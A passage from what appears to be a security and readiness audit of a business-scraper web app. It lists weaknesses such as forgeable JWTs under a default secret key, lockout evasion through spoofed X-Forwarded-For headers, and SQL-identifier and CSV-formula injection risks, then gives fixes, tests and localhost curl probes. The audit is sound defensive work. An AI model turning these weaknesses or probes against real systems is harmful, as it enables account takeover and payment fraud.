**Fix:** Prefix any cell starting with `= + - @ \t \r` with `'` before writing. Independently, reject usernames not matching `^[A-Za-z0-9._-]{3,32}$` at registration and login.

---

### M-8 � Unauthenticated, unthrottled analytics ingestion
**`backend/main.py:6009-6026`** ? **`backend/analytics/ingest.py:123-169`**

```python
current_user: Optional[dict] = Depends(get_optional_user)   # anonymous OK
```

Batches are capped at 100 events (`ingest.py:33`) but the number of **requests** is unlimited. There is no global rate limit middleware in the app (`grep -n "slowapi\|RateLimit" backend/` ? nothing outside the login-specific table).

**Impact:** Unbounded writes to `analytics_events` ? disk exhaustion ? database outage for the whole product.

**Secondary (`ingest.py:75`):** for anonymous callers `user_id` is taken from the client payload, so events can be attributed to arbitrary user IDs, poisoning `/api/admin/analytics/user-journey/{user_id}` and the funnel.

**Fix:** Per-IP rate limit (e.g. 30 req/min) plus a daily row cap. Drop client-supplied `user_id` entirely � use `auth_user_id` or `NULL`.

---

### M-9 � JWTs cannot be revoked; 7-day lifetime; stored in `localStorage`
**`backend/auth.py:16-18, 28-37`**, **`backend/main.py:1354`**, **`frontend/lib/services/api_service.dart:46-55`**, **`frontend/web/index.html:51`**

- Token payload is `{"sub": username, "exp": ...}` only � no `jti`, no issued-at versioning, no denylist.
- `ACCESS_TOKEN_EXPIRE_MINUTES = 60*24*7` (7 days) in both `auth.py:18` and `config.py:82`.
- `logout()` (`api_service.dart:166-168`) only clears local storage; the token stays valid server-side.
- `backend/scripts/reset_admin_password.py:69` states this plainly: *"Existing access tokens remain valid until expiry."*
- `saveToken(persist: true)` writes to `SharedPreferences` ? `localStorage` on web, readable by any script on the origin.
- `frontend/web/index.html:51` loads `https://js.stripe.com/v3/` with no CSP and no `integrity`. There is no `Content-Security-Policy` in `frontend/vercel.json` or `frontend/netlify.toml`. Stripe is no longer used � `ensure_default_admin_settings` (`main.py:174-178`) force-pins `payment_methods_enabled = "coinbase"`.

**Impact:** A stolen token grants 7 days of access that cannot be cut off � including after suspension? (No: `get_current_user:1034` re-reads `is_suspended` per request, so suspension *does* take effect. But password reset does not invalidate sessions.)

**Fix:** Reduce access tokens to 15�60 min with a rotating refresh token. Add a `token_version` column bumped on password reset and suspension, carried as a JWT claim and checked in `get_current_user`. Remove the unused Stripe script tag and add a strict `Content-Security-Policy` header in `frontend/vercel.json`.

---

### M-10 � Two diverging `SECRET_KEY` defaults, both insecure
**`backend/auth.py:16`** vs **`backend/config.py:16`**

```python
# auth.py � this is the one that actually signs and verifies tokens
SECRET_KEY = os.getenv("SECRET_KEY", "your-secret-key-change-in-production")
# config.py � defined, exported, and never used for JWT
SECRET_KEY = os.getenv("SECRET_KEY", "a_secure_secret_key")
```

Neither raises when unset. `README.md:148` lists this only under "Troubleshooting." If `SECRET_KEY` is missing in production, tokens are signed with a public constant � **anyone can forge a JWT for any username, including `admin`**, and `get_current_user` will accept it.

A second subtlety: `auth.py` calls `os.getenv` at import time, but `load_dotenv` runs inside `config.py:10`. `main.py` imports `config` (line 26) before `auth` (line 52), so the ordering happens to work � but `auth.py` is importable standalone (e.g. `database.py:463`) and would then silently fall back to the constant.

**Fix:** Delete the duplicate in `config.py`. In `auth.py`, import `config` first and `raise RuntimeError` if `SECRET_KEY` is unset or matches a known placeholder. Add a startup assertion in `main.py`.

---

### M-11 � Progress reaches 100 % before any scraping happens
**`backend/main.py:3295, 3300-3327`** ? **`frontend/lib/screens/scraping_screen.dart:1586, 1675-1713`**

```python
progress = int((idx + 1) / len(request.cities_data) * 100)   # 3295
...
def _pre_city(conn, cursor):                                  # 3300
    cursor.execute("UPDATE jobs SET current_city = ?, progress = ? WHERE job_id = ?",
                   (current_city, progress, job_id))          # written BEFORE scrape_location
```

For a one-city job `progress` is **100** from the first second. The frontend renders it unmodified:
```dart
final value = (progress / 100).clamp(0.0, 1.0);        // 1676
Text('${progress.clamp(0, 100)}%')                     // 1694
Text(isRunning ? 'Processing' : 'Idle')                // 1705
```
Result: a full ring reading "100% / Processing" for the entire run, then results appear afterwards.

**Fix:** Write `int(idx / len(...) * 100)` before the city and `int((idx+1)/len(...)*100)` after `_post_city` succeeds. Cap at 99 until the job is marked `completed`. In the UI, render an indeterminate spinner when `progress >= 100 && status == running`.

---

### M-12 � Status polling returns the full result set every 2 seconds
**`frontend/lib/providers/scraper_provider.dart:107-144`** ? **`backend/main.py:3807-3865`**

`GET /api/jobs/{id}` returns `results` (every row, **main.py:3833-3850**) plus `logs` (every row, **3825**) on each call. `_pollJobStatus` hits it every 2 s for the job's whole lifetime.

**Impact:** A 1,000-result job re-transmits the entire payload ~30�/minute. Quadratic bandwidth and DB load; on mobile, data burn.

**Second defect, same function (lines 136-142):**
```dart
} catch (e) {
  _currentJob!.error = 'Failed to get job status: $e';
  _currentJob!.status = ScrapingStatus.failed;
  _status = ScrapingStatus.failed;
  break;
}
```
A **single** transient 502 or timeout permanently marks the job failed **in the UI only** � the backend job keeps running and the credits stay spent. The user sees a failure for a job that succeeds.

**Fix:** Add `?include_results=false` (or a dedicated `/api/jobs/{id}/status` returning only `status/progress/current_city/result_count`) and fetch results once on completion. Send only log entries after a client-held cursor. Retry polling with exponential backoff, tolerating 3 consecutive failures before declaring failure, and stop the loop on provider disposal.

---

### M-13 � Credit config documented as tunable, hardcoded in practice
**`backend/config.py:88-101`** and **`backend/database.py:497-499`** vs **`README.md:110-111`**

```python
# config.py:89 � "These settings can be overridden by the database `credit_config` table"
DEFAULT_CREDIT_CONFIG = { "base": 10, "per_city": 5, ..., "max_jobs_per_hour": 5 }

# database.py:497
def get_credit_config():
    return config.DEFAULT_CREDIT_CONFIG      # no DB read, no env read
```

`README.md:110-111` documents `CREDITS_BASE`, `CREDITS_PER_CITY`, `CREDITS_PER_RESULT`, `CREDITS_MIN_JOB`, `CREDITS_STARTING`, `MAX_JOBS_PER_HOUR`, `MAX_CONCURRENT_JOBS`. **None of these environment variables is read anywhere.** `grep -rn "CREDITS_BASE\|MAX_JOBS_PER_HOUR" backend/` ? 0 hits.

Only `starting_credits` is overridable, and only via the admin-settings table (`main.py:194-200`).

**Impact:** Operators responding to abuse (H-1) believe they can lower `MAX_CONCURRENT_JOBS` without a deploy. They cannot.

**Fix:** Implement `get_credit_config()` to read the `credit_config`/`admin_settings` table with the dict as fallback, or correct `README.md` and the `config.py` comment.

---

### M-14 � `SELECT *` responses indexed by positional offset
**`backend/db/payment_crud.py:62, 68, 163, 271, 278, 341, 489, 495, 619`** consumed at **`main.py:4224-4244, 4254-4275, 5267-5286, 5148-5168, 4807-4828`**

```python
def list_active_packages():
    return execute_query("SELECT * FROM credit_packages ORDER BY ...", fetch_all=True)
```
```python
features = json.loads(row[9]) if row[9] else None    # main.py:4229
"is_active": bool(row[7]),                           # main.py:4241
```

Column order is an implicit contract. Migration 009 already rebuilds tables via `CREATE � _new` + `INSERT � SELECT` + `RENAME` (`009_paypal_provider_sqlite.sql:8-44`) � any future migration that reorders or inserts a column silently shifts every index, and `is_active`/`features` start reading the wrong values. There is no test asserting column order.

**Fix:** Replace every `SELECT *` with an explicit column list (as `get_transaction` at **payment_crud.py:149-157** already does � its comment even says *"Explicit column order for stable tuple indices"*), or switch to `sqlite3.Row` / `pymysql.cursors.DictCursor` and index by name.

---

### M-15 � Dynamic `SET` clauses interpolate column names
**`backend/db/payment_crud.py:81-92, 517-523, 645-653, 738-744`**

```python
for key, value in updates.items():
    set_clauses.append(f"{key} = {get_placeholder()}")     # key is NOT parameterised
```

Values are bound correctly; **identifiers are not**. Today all four callers (`main.py:5091-5099, 5176-5198, 5294-5307, 5397-5410`) build `updates` from a fixed whitelist of Pydantic field names, so this is not currently exploitable. It is a loaded gun: one future `**req.dict()` makes it SQL injection reachable by any `support`-level account (see C-4).

**Fix:** Validate each key against an explicit per-table allowlist inside the CRUD function and raise on anything else.

---

### M-16 � Subscription renewal corrupts billing periods and re-grants credits on retry
**`backend/subscriptions/subscription_manager.py:232-248`**

```python
created_at = now_db_string()
execute_query("""UPDATE user_subscriptions
    SET credits_allocated_this_period = ?, credits_used_this_period = 0,
        credits_rolled_over = ?, current_period_start = ?, current_period_end = ?,
        next_billing_date = ?, updated_at = ? WHERE id = ?""",
    (credits_per_period, rollover, created_at, created_at, created_at, created_at, user_sub_id))
```

`current_period_start`, `current_period_end`, and `next_billing_date` are **all set to "now"** instead of being read from the Stripe invoice. After one renewal, `GET /api/subscriptions/my-subscription` reports a period that ended the instant it began.

`handle_invoice_paid` is also not idempotent � it allocates `credits_per_period + rollover` on every invocation with no guard. Stripe retries `invoice.paid`; the only thing preventing double-grants is the unrelated UNIQUE-constraint crash in H-4.

**Fix:** Take `period_start`/`period_end` from `invoice_obj["lines"]["data"][0]["period"]`. Guard the allocation on the invoice ID (store `last_invoice_id` on `user_subscriptions` and no-op if unchanged).

---

### M-17 � `api/index.py` sends `Access-Control-Allow-Origin: *` with credentials enabled
**`api/index.py:12-18`**

```python
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True,
                   allow_methods=["*"], allow_headers=["*"])
```

The main app (`main.py:536-543`) correctly uses an explicit origin list. This serverless entry does not. It currently exposes only static city/region data, so disclosure impact is nil � but the **root `vercel.json:9-18` routes `/api/(.*)` and `/(.*)` to this handler**, so if it is ever extended, or if the root project is the live deployment, authenticated routes would inherit wildcard CORS.

**Fix:** Mirror `config.ALLOWED_ORIGINS`, or set `allow_credentials=False` since no credentials are used. Resolve which `vercel.json` is authoritative and delete the other.

---

### M-18 � Interactive API docs publicly exposed
**`backend/main.py:337`**

```python
app = FastAPI(title="Google Business Scraper API", version="2.0.0", debug=config.DEBUG)
```

No `docs_url=None` / `redoc_url=None` / `openapi_url=None`. `/docs`, `/redoc`, and `/openapi.json` are reachable unauthenticated, publishing all 128 routes � every `/api/admin/*` path, every request schema, and `/internal/debug_users` (C-1).

Additionally, `debug=config.DEBUG` means a misconfigured `DEBUG=True` turns Starlette's traceback middleware on, leaking stack traces and local variables to clients.

**Fix:** `FastAPI(..., docs_url=None if not config.DEBUG else "/docs", openapi_url=None if not config.DEBUG else "/openapi.json", debug=False)`.

---

### M-19 � Coinbase `charge:resolved` grants full credits without an amount check
**`backend/payments/webhook_handler.py:110-116`**

```python
if event_type in ("charge:confirmed", "charge:resolved"):
    self._processor.finalize_transaction_completed(
        transaction_id=str(txn_uuid), provider_txn_id=charge_id, provider="coinbase")
        # paid_amount_cents omitted ? falls back to the EXPECTED amount
```

`finalize_transaction_completed` (`payment_processor.py:537`) does `amount_cents = int(paid_amount_cents or row[3] or 0)` � with the argument omitted it uses the amount the system *expected*, never what was actually received. In Coinbase Commerce, `charge:resolved` specifically denotes an **underpaid / overpaid / delayed** charge that a merchant manually resolved.

The Stripe branch passes `amount_received` correctly (**webhook_handler.py:48**); Coinbase does not.

**Impact:** An underpayment resolved for any reason credits the full package. The invoice (`payment_processor.py:601-628`) also records the expected amount, so the books disagree with Coinbase.

**Fix:** Extract `data["payments"][-1]["value"]["local"]["amount"]` and pass it as `paid_amount_cents`. Reject or pro-rate when the paid amount is below the expected amount beyond a tolerance.

---

### M-20 � Contrast failures in the active job panel
**`frontend/lib/screens/scraping_screen.dart:1689-1691, 1704-1710, 2890-2899`** with **`frontend/lib/core/theme/app_colors.dart:14, 17, 85`**

Computed WCAG 2.1 contrast ratios:

| Element | Foreground | Background | Ratio | Requirement | Result |
|---|---|---|---|---|---|
| "Processing" / "Idle" label (line 1707, `labelSmall`) | `primaryBlueLight` `#347381` | `surfaceDark` `#1f1f21` | **3.07 : 1** | 4.5 : 1 (AA, normal text) | **Fail** |
| Progress-ring arc (line 1690) | `primaryBlue` `#2C5F6D` | `Colors.white12` over `#1f1f21` � `#3A3A3B` | **1.61 : 1** | 3 : 1 (AA, non-text) | **Fail** |
| Progress-ring arc vs. card | `#2C5F6D` | `#1f1f21` | **2.32 : 1** | 3 : 1 | **Fail** |
| "v2.4.1" (line 1626, `white54`) | � `#989899` | `#1f1f21` | 5.70 : 1 | 4.5 : 1 | Pass |

The status label is the only text conveying whether the job is live, and the ring is the only visual progress indicator � the two least legible elements carry the most important state.

**Fix:** Use `AppColors.primaryBlueLight` brightened to � `#5FA5B5` (� 6.4 : 1 on `#1f1f21`) for the label, and `#4D97A9` or lighter for the ring arc. `AppColors.brighten()` (`app_colors.dart:169-173`) already exists for this.

---

### L-1 � Dependency hygiene

**`backend/requirements.txt`**

| Package | Pinned | Note |
|---|---|---|
| `python-jose[cryptography]` | `3.3.0` (line 5) | Last release Jan 2022. Known advisories against 3.3.0 include algorithm-confusion and a decompression-bomb DoS in JWE handling. **Verify against the current advisory database before acting.** |
| `fastapi` | `0.104.1` (line 1) | Oct 2023; `@app.on_event` (used at `main.py:340, 515`) is deprecated in favour of lifespan handlers. |
| `playwright` | `1.40.0` (line 3) | Nov 2023; bundled Chromium is ~2 years stale � a material anti-bot liability for a scraper. |
| `stripe` | `7.8.0` (line 25) | Several major versions behind. |
| `PyMySQL` | `1.0.3` (line 10) | 1.1.x available. |
| `coinbase-commerce` | `1.0.1` (line 26) | Declared but unused � `coinbase_service.py` uses `requests` directly. |
| `flower` | `2.0.1` (line 34) | Monitoring UI shipped into the production image. |

**Other:**
- **No lockfile for either stack.** `.gitignore:50` is a blanket `*.lock`, so `frontend/pubspec.lock` (present on disk, 26 KB) is untracked. All Dart deps use caret ranges (`pubspec.yaml:15-29`) � two builds of the same commit can differ.
- `pubspec.yaml:29` declares `pay: ^2.0.0` for Google Pay, which `ensure_default_admin_settings` (`main.py:174-178`) permanently disables.
- No `pip-audit`, `safety`, `dependabot.yml`, or `osv-scanner` anywhere.

**Fix:** Change `.gitignore:50` to `package-lock.json`-style specifics and commit `pubspec.lock`. Generate `requirements.lock` via `pip-compile`. Upgrade `python-jose` (or migrate to `PyJWT`), FastAPI, and Playwright. Remove `flower` and `coinbase-commerce`. Add `pip-audit` + `dart pub outdated` to CI.

---

### L-2 � CI does not run the tests

**`.github/workflows/test.yml`** � the file is named "Test Backend" and never invokes pytest:
- **45-56:** runs `init_database()` inside `try/except` that **prints the exception and exits 0** (*"This is acceptable for testing"*).
- **58-74:** imports the app and asserts `GET /api/health == 200`.
- `backend/tests/` is never executed. `frontend/test/widget_test.dart` is never executed.

**`.github/workflows/deploy.yml:26-29`** � its `test` job is `python -c "import main"`.

**Impact:** The six test modules under `backend/tests/` are decorative. Every finding in this report could have been merged by a green CI. There is no linting (`ruff`/`black`/`mypy`/`flutter analyze`), no coverage gate, and no MySQL matrix � which is how H-9 survived.

**Fix:** Replace the inline `python -c` blocks with `pytest tests/ -v --cov=. --cov-fail-under=60`, add `flutter analyze && flutter test`, add `ruff check` and `pip-audit`, and add a `services: mysql:8.0` matrix leg.

---

### L-3 � Observability and backups are absent

- **Logging** (`main.py:549-556`): `logging.FileHandler("scraper.log")` writes to the container filesystem � lost on every restart, invisible to any log aggregator. No structured/JSON formatter, no correlation of `request_id` into log records (the middleware puts it on `request.state` and the response header only, `audit/middleware.py:13, 19`).
- **No error tracking.** `grep -rn "sentry\|opentelemetry\|prometheus" backend/` ? nothing.
- **`GET /api/health`** (`main.py:5932-5935`) returns a static dict � it does not check DB connectivity, so a liveness probe stays green through a total database outage.
- **No metrics**: job success rate, scrape duration, credit burn, webhook failure rate � none are emitted.
- **No backup or restore procedure** anywhere in the repo. No `mysqldump` cron, no documented RPO/RTO, no restore rehearsal. `docker-compose.yml:34-35` keeps MySQL in a named volume with no backup sidecar. Combined with M-5 (tracked `.db`) and H-8 (no migration rollback), there is no safe recovery path.
- **Debug artefacts committed**: six PNG screenshots under `backend/results/` (`debug_search_input_San_Francisco_CA_*.png`, `initial_San_Francisco_CA_*.png`) and `WhatsApp Image 2026-02-01 at 7.37.51 AM.jpeg` at the repo root. Repo size is **193 MB**.

**Fix:** `StreamHandler` to stdout with a JSON formatter and `request_id`; Sentry DSN; a real `/api/health` that executes `SELECT 1`; a separate `/api/ready`; Prometheus counters for jobs/webhooks/credits; automated nightly `mysqldump` to object storage with a monthly restore test; remove the committed binaries.

---

### L-4 � Dead and broken configuration

| File | Line | Issue |
|---|---|---|
| `frontend/netlify.toml` | 2 | `--web-renderer canvaskit` was removed in Flutter 3.29 � `build_web.sh:19` says so explicitly. Netlify builds fail. |
| `docker-compose.yml` | 1 | `version: '3.8'` is obsolete in Compose v2. |
| `docker-compose.yml` | 46-58 | `volumes:` block has the commented-out `nginx` service nested inside it � if uncommented it would be invalid YAML structure. |
| `docker-compose.local.yml` | 23 | References `frontend/Dockerfile.local`; that file and `frontend/nginx.local.conf` are present on disk but absent from `git ls-files`. |
| `backend/.env.example` | 30 | Contains what appears to be a real Google Pay merchant ID (`<redacted GOOGLE_PAY_MERCHANT_ID>`). Not a secret, but production-identifying data in a template. |
| `frontend/lib/config/environment.dart` | 6-8 | Two stale production hosts hardcoded, with special-case logic to *ignore* `_legacyRailwayApiUrl` (line 17) � accumulated deployment debt. |
| `backend/check_syntax.py`, `backend/test_fixes.py`, `test_backend.py` | � | Ad-hoc scripts outside the pytest tree, not run by anything. |

---

## 4. Hypotheses Requiring Runtime Validation

These are code-grounded concerns I could **not** confirm without execution.

### HYP-1 � `UPDATE � ORDER BY � LIMIT` may raise on SQLite
**`backend/main.py:3638-3642`**
```python
cursor.execute("""
    UPDATE credit_ledger SET job_id = ?
    WHERE user_id = ? AND job_id IS NULL
    ORDER BY created_at DESC LIMIT 1
""", (job_id, user_id))
```
SQLite supports `ORDER BY`/`LIMIT` on `UPDATE` **only** when compiled with `SQLITE_ENABLE_UPDATE_DELETE_LIMIT`. Debian/Ubuntu system SQLite enables it; the amalgamation bundled with CPython's official Windows installers generally does not. MySQL supports it unconditionally.

If it raises, it does so **after** `deduct_credits` and the `INSERT INTO jobs` have committed and **before** `background_tasks.add_task` � so the user is charged, a `pending` job row exists, no scraping ever starts, and the request returns 500. The startup recovery (`main.py:355-364`) would later flip it to `failed`, with no refund (H-3).

**Why unverified:** `python -c` was blocked. **Validate with:**
```bash
python -c "import sqlite3;c=sqlite3.connect(':memory:');c.execute('CREATE TABLE t(a,b)');c.execute('UPDATE t SET a=1 ORDER BY b LIMIT 1')"
```
**Fix regardless:** `UPDATE credit_ledger SET job_id = ? WHERE id = (SELECT id FROM credit_ledger WHERE user_id = ? AND job_id IS NULL ORDER BY created_at DESC LIMIT 1)` � portable. Better: have `deduct_credits` return the ledger id and update by primary key.

### HYP-2 � `dart:io` import in `error_handler.dart`
**`frontend/lib/core/error_handler.dart:1`** imports `dart:io` and branches on `SocketException` (lines 110, 134, 152). Flutter Web ships a `dart:io` stub so this most likely compiles, but `SocketException` can never be thrown there (`package:http` uses `BrowserClient`, which throws `ClientException`). The `ClientException` branch at line 115 covers it, so behaviour is probably correct � but the dead branches should be confirmed against an actual `flutter build web`.

### HYP-3 � MySQL pool behaviour under load
**`backend/database.py:148-289`.** The `LifoQueue` pool defaults to size 5 (`_mysql_pool_config:154`). Every request handler in `main.py` opens and closes multiple connections (see �2.2 � job creation uses six). When the pool is exhausted, `_acquire_mysql_connection` (**210-237**) falls through to `_create_mysql_connection()` **without bound**, so connection count is limited only by MySQL's `max_connections`. `_release_mysql_connection` (**240-261**) then closes the overflow. Under concurrency this likely degrades into connect-per-query with a 5 s connect timeout. **Needs load testing.**

### HYP-4 � Migration `009` transaction nesting on SQLite
**`backend/migrations/009_paypal_provider_sqlite.sql:5, 79`** issue explicit `BEGIN TRANSACTION;` / `COMMIT;`, executed as individual statements by the runner (`migration_runner.py:263-265`) which also calls `conn.commit()` itself (**279**). Python's `sqlite3` in legacy isolation mode manages implicit transactions; whether `BEGIN TRANSACTION` raises *"cannot start a transaction within a transaction"* depends on whether a prior DML statement left one open. On a clean run migrations 000�008 each end with `conn.commit()`, so it probably succeeds � but this is fragile and ordering-dependent. **Validate by running `init_database()` against a fresh temp SQLite file.**

### HYP-5 � Which Vercel project is live
Root `vercel.json` builds `api/index.py` and routes **all** paths to it; `frontend/vercel.json` builds the SPA and proxies `/api/*` to `server.progresslms.io`. Both are committed. If the root config is the live one, `/api/auth/login` returns 404 because `api/index.py` has no auth routes. **Confirm in the Vercel dashboard.**

---

## 5. Top Ten Fixes, in Implementation Order

Ordered so each step is safe to ship on its own and unblocks the next.

| # | Fix | Finding | Effort | Why this order |
|---|---|---|---|---|
| 1 | Delete `/internal/debug_users`; set `docs_url=None`/`openapi_url=None`; `debug=False` | C-1, M-18 | 15 min | One-line removals that stop active PII disclosure and reconnaissance. |
| 2 | Remove hardcoded admin credentials: invert to `ENABLE_DEFAULT_ADMIN`, require `DEFAULT_ADMIN_PASSWORD`, delete the promote-existing-user branch, scrub `backend/scripts/*.py` + `AGENTS.md` + `.env.example`; **rotate the live password** | C-2 | 1 h | Closes the most direct takeover path. Must precede any credential rotation downstream. |
| 3 | Fail fast on a missing/placeholder `SECRET_KEY`; delete the duplicate in `config.py` | M-10 | 30 min | Without this, every later authz fix is moot � forged tokens bypass all of them. |
| 4 | Fix the role model: stop setting `is_admin=1` for `support`; drop the `or is_admin` fallback; move all mutating routes to `get_admin_or_above`; block self/upward role changes | C-4 | 3 h | Largest blast radius (62 endpoints). Do it before trusting any admin audit trail. |
| 5 | Add ownership checks to `/api/subscriptions/{id}/{cancel,pause,resume}` | H-2 | 30 min | Small, isolated, stops a live cross-tenant destructive action. |
| 6 | Validate `ScrapingRequest` (`ge=1, le=100`; `max_length=50`) and clamp `estimate_credit_cost` | H-1 | 1 h | Stops billing bypass and the DoS vector before any load increase. |
| 7 | Implement password-reset email; delete the `print` block; build the link from `FRONTEND_URL`. Bundle with: un-ignore `backend/notifications/templates/*.html` (`.gitignore:92`) | C-3, H-7 | 3 h | Reset is unusable until the templates ship, so these must land together. |
| 8 | Make credit mutations atomic (conditional `UPDATE � WHERE balance >= ?`, single transaction) and add password minimums | M-1, H-5 | 4 h | Correctness foundation for every billing fix that follows. |
| 9 | Fix the payment pipeline: idempotent webhook ingestion returning 200 (H-4); `paid_amount_cents` on the Coinbase branch (M-19); atomic promo reservation (M-2); min/max on Coinbase paths; implement refunds on job failure/cancel (H-3) | H-3, H-4, M-2, M-19 | 2 days | The money path. Needs #8's transactional primitives in place. |
| 10 | Make the backend deployable: fix `pricing_engine.py:61` and `event_queries.py:269` for MySQL (H-9); fix `docker-compose.yml`'s `DATABASE_URL` (M-4); make migrations fail loudly and verify checksums (H-8); deploy to a managed host off the workstation (H-10); add a Celery worker | H-8, H-9, H-10, M-4 | 1 week | The largest piece � and pointless to start before the application layer is correct. |

**Run in parallel (no sequencing dependency):** M-20 contrast, M-11 progress, M-12 polling, L-2 CI wiring.

---

## 6. Staged Production Readiness Plan

### Stage 0 � Emergency (today, before any further traffic)
1. Take `/internal/debug_users` offline (top-ten #1).
2. Rotate the admin password on every live database; confirm `DISABLE_DEFAULT_ADMIN=true` is set in the live environment.
3. Confirm `SECRET_KEY` is set in production. If it was ever unset, rotate it � this invalidates all outstanding tokens, which is the desired outcome.
4. Audit production logs for leaked reset tokens; invalidate every outstanding `password_reset_tokens` row.
5. Determine whether `scraper.db` ever held real data (`git log --all -- scraper.db`). If so, treat as a disclosed-data incident.

**Exit:** no unauthenticated data egress, no publicly known credentials.

### Stage 1 � Security hardening (week 1)
Top-ten #2 through #7, plus M-6 (audit chain), M-7 (CSV escaping), M-8 (analytics rate limit), M-9 (token lifetime + CSP). Add `pip-audit` and upgrade `python-jose`.

**Exit:** every endpoint has a correct authorization check; no secrets in the repo; a clean clone sends real emails.

### Stage 2 � Correctness and money (week 2)
Top-ten #8 and #9, plus M-16 (subscription periods), M-14 (`SELECT *`), M-15 (identifier allowlist), M-13 (credit config).

**Exit:** no double-spend under concurrency; every paid transaction grants credits exactly once; failed jobs refund.

### Stage 3 � Deployability (weeks 3�4)
Top-ten #10. Additionally: commit `pubspec.lock`, generate `requirements.lock`, pick one deploy target and delete the other four configs, remove the 193 MB of committed binaries, wire real CI (L-2).

**Exit:** `git clone && docker compose up` produces a working stack on MySQL; CI is red on a failing test.

### Stage 4 � Operability (week 5)
L-3 in full: stdout JSON logging with `request_id`, Sentry, a real `/api/health` + `/api/ready`, Prometheus metrics, automated backups **with a rehearsed restore**.

**Exit:** a production incident is detectable and recoverable without the original developer.

### Stage 5 � Scale and UX (week 6+)
Move scraping to Celery workers (addresses the `BackgroundTasks` architecture risk under H-1). M-11, M-12, M-20. Load-test the MySQL pool (HYP-3). Add proxy rotation for the scraper.

**Exit:** the API tier scales independently of scraping; progress UI is accurate and accessible.

---

## 7. Missing Tests

Current coverage: six modules under `backend/tests/` � and CI runs **none** of them (L-2). Coverage of the credit system, job lifecycle, webhooks, authorization, and every frontend screen is zero.

### Authorization (highest value � nothing exists today)
- `support` role cannot `PUT /api/admin/users/{id}` with `role: "owner"` (C-4).
- `support` is rejected by `get_admin_or_above` endpoints (`GET /api/admin/jobs`, `POST /api/admin/approvals/{id}/reject`).
- `user` role ? 403 on every one of the 68 role-guarded endpoints (parametrize over the route table).
- `GET /internal/debug_users` ? 404 (regression guard for C-1).
- User A cannot read, download, cancel, or delete user B's job (`/api/jobs/{id}`, `/results`, `/download`, `/cancel`, `DELETE`).
- User A cannot cancel user B's subscription (H-2).
- User A cannot read user B's invoice (`/api/invoices/{id}`) or transaction.
- A valid JWT for a since-suspended user ? 403 *(partially covered by `test_auth_approval.py:129`)*.

### Credits and billing
- Concurrent `POST /api/jobs` (threaded client) never over-draws the balance (M-1).
- `max_results_per_city = -10` with 100 cities is **rejected**, not charged 15 credits (H-1).
- `cities_data` of 10,000 entries is rejected.
- A failed job refunds `charged - earned`; a cancelled job refunds the unscraped remainder (H-3).
- `credit_ledger` sum always equals `users.credit_balance` (property test over a random operation sequence).
- `estimate_credit_cost` is monotonic and never below `min_job` (property test).

### Payments and webhooks
- Replaying an identical Coinbase webhook `id` returns 200 and grants credits exactly **once** (H-4).
- An invalid Coinbase HMAC ? 400 and no transaction mutation.
- A `charge:resolved` with an underpaid amount does **not** grant full credits (M-19).
- A `max_uses: 1` promo used by two concurrent checkouts succeeds exactly once (M-2).
- A 100 %-off promo yielding `total_cents == 0` is rejected on both Coinbase paths (M-2).
- `finalize_transaction_completed` called twice creates one invoice and one ledger row.
- `handle_invoice_paid` called twice for the same invoice allocates one period of credits (M-16).

### Auth
- Register with a 5-character password ? 422 (H-5).
- Login lockout cannot be evaded by rotating `X-Forwarded-For` (H-6).
- A password reset invalidates existing access tokens (M-9, once `token_version` exists).
- Reset token is single-use, expires, and is **never** present in captured stdout (C-3 � assert via `capsys`).

### Database and migrations
- `init_database()` on a fresh temp file applies all 14 migrations and creates every expected table (extend `test_migrations.py`).
- A deliberately corrupted migration file causes startup to **raise**, not log-and-continue (H-8).
- A modified checksum for an applied migration is detected (H-8).
- **The same suite runs green against MySQL 8** � this single matrix leg catches H-9 and both of its siblings.
- `conftest` asserts the resolved DB path is inside `tmp_path` (M-3).
- Column-order contract test for every `SELECT *` consumer (M-14).

### Frontend
- `ScraperProvider._pollJobStatus` survives three consecutive network errors without marking the job failed (M-12).
- `_buildProgressCircle` shows < 100 % while `status == running` (M-11).
- Golden tests for `scraping_screen` in light and dark themes.
- Automated contrast assertions over the `AppColors` pairs used as foreground/background (M-20).
- `ApiService` attaches `Authorization` on every authenticated call and omits it on `register`/`login`/`forgot-password`.

---

## 8. Local Verification Commands

I was unable to run any of these � they are given so the fixes can be verified.

```bash
cd F:/webTest/scraper/business_scraper_api

# -- 0. Baseline: run the suite that CI never runs ------------------------
cd backend
DATABASE_URL="sqlite:///$(mktemp -d)/test.db" DB_TYPE=sqlite \
  python -m pytest tests/ -v --cov=. --cov-report=term-missing

# -- 1. HYP-1: does this SQLite build support UPDATE ... ORDER BY LIMIT? --
python -c "import sqlite3;c=sqlite3.connect(':memory:');c.execute('CREATE TABLE t(a,b)');\
c.execute('UPDATE t SET a=1 ORDER BY b LIMIT 1');print('SUPPORTED')"

# -- 2. HYP-4 / H-8: clean migration run must not raise -------------------
TMP=$(mktemp -d); DATABASE_URL="sqlite:///$TMP/fresh.db" DB_TYPE=sqlite \
  python -c "from database import init_database; print(init_database())"
sqlite3 $TMP/fresh.db "SELECT version, filename FROM schema_migrations ORDER BY version;"

# -- 3. H-9: the MySQL leg that CI is missing -----------------------------
docker run -d --name audit-mysql -e MYSQL_ROOT_PASSWORD=t -e MYSQL_DATABASE=scraper_db \
  -p 13306:3306 mysql:8.0
sleep 25
DB_TYPE=mysql DATABASE_URL="mysql://root:t@127.0.0.1:13306/scraper_db" \
  python -c "from database import init_database; init_database()"
DB_TYPE=mysql DATABASE_URL="mysql://root:t@127.0.0.1:13306/scraper_db" \
  python -c "from payments.pricing_engine import PricingEngine; print(PricingEngine().get_user_pricing_tier(1))"
#   ^ expected to raise (1305) FUNCTION ... datetime does not exist until H-9 is fixed
docker rm -f audit-mysql

# -- 4. C-1: debug endpoint must be gone ----------------------------------
SKIP_DB_INIT=1 uvicorn main:app --port 8099 &
sleep 4
curl -s -o /dev/null -w "debug_users -> %{http_code}\n" http://127.0.0.1:8099/internal/debug_users
curl -s -o /dev/null -w "openapi    -> %{http_code}\n" http://127.0.0.1:8099/openapi.json
#   both must be 404

# -- 5. H-1: oversized / negative job inputs must be rejected -------------
TOKEN="<paste a normal user's JWT>"
curl -s -X POST http://127.0.0.1:8099/api/jobs -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"category":"x","cities_data":["a,b","c,d","e,f"],"max_results_per_city":-10}'
#   must be 422, not a 15-credit job

# -- 6. H-6: lockout must not be evadable via X-Forwarded-For -------------
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://127.0.0.1:8099/api/auth/login \
    -H "X-Forwarded-For: 10.0.0.$i" -H 'Content-Type: application/json' \
